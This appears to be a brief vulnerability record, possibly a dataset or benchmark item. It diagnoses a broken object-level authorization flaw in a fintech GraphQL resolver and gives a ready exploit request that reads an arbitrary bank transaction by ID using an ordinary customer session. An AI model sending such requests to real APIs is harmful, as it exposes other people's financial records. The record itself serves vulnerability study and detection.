diagnosis: The nested field resolver on FinancialAccountType takes transaction_id as an argument and performs a global query on BankTransaction without constraining the lookup to the parent financial account instance (self) or info.context.user, allowing clients to query any user's financial transactions.
exploit_request:
POST /graphql/ HTTP/1.1
Host: api.fintech.example
Cookie: sessionid=customer_session
Content-Type: application/json

{"query": "query { myAccount { id transactionRecord(transactionId: 99401) { id amount counterparty memo } } }"}
